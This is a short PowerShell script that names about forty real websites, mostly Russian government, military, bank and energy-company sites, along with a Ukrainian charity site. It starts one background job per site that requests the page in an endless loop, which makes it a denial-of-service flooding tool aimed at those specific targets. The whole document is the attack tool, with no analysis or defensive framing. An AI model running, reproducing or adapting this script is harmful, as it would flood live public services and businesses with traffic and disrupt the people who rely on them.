$urls = 
@(
'http://kremlin.ru/',
'https://www.gosuslugi.ru/',
'https://epp.genproc.gov.ru/',
'http://ach.gov.ru/',
'http://www.scrf.gov.ru',
'https://mil.ru',
'https://gazprom.ru',
'https://lukoil.ru',
'https://magnit.ru',
'https://www.nornickel.com',
'https://www.surgutneftegas.ru',
'https://www.tatneft.ru',
'https://www.evraz.com/ru',
'https://nlmk.com',
'https://sibur.ru',
'https://serverstal.com',
'https://www.metalloinvest.com',
'https://nangs.org',
'https://rmk-group.ru/ru',
'https://ya.ru',
'https://www.polymetalinternational.com/ru/',
'https://www.uralkali.com/ru/',
'https://www.eurosib.ru/',
'https://omk.ru',
'https://www.sberbank.ru',
'https://www.vtb.ru',
'https://www.gazprombank.ru',
'https://mos.ru/uslugi/',
'https://goverment.ru',
'https://nalog.gov.ru',
'https://customs.gov.ru',
'https://prof.gov.ru',
'https://rkn.gov.ru',
'https://sberbank.ru',
'https://mgok.mskobr.ru',
'https://sepcnaz.ru',
'https://rosbank.ru',
'https://currency.com/ru',
'https://www.ria.ru',
'https://www.fsb.ru',
'https://savelife.net.ua/',
)


$functions = {
    function Start-Request {
        param([string]$url)

        while ($true) 
        {
            try 
            { 
                Invoke-WebRequest -Uri $url
            } 
            finally 
            { 
            }
        }
    }
}


foreach ($url in $urls)
{
    Start-Job -InitializationScript $functions -ScriptBlock { Start-Request $url } -Name $url
}

while($true){}